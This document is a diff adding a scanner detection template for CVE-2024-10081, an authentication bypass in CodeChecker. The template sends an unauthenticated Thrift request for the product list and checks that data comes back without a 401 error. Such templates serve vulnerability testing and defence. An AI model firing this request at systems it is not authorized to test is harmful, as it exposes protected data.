@@ -1,0 +1,32 @@
+id: codechecker-auth-bypass
+info:
+  name: CodeChecker Authentication Bypass Vulnerability (CVE-2024-10081)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: auth-bypass,cve-2024-10081
+http:
+  - raw:
+      - |
+        POST /v6.0/Products/Authentication HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-thrift
+
+        [1,"getProducts",1,1,{}]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"0\":{\"lst\":[\"rec\""
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Error code 401: Unauthorized"
+      - type: word
+        part: header
+        words:
+          - "application/x-thrift"
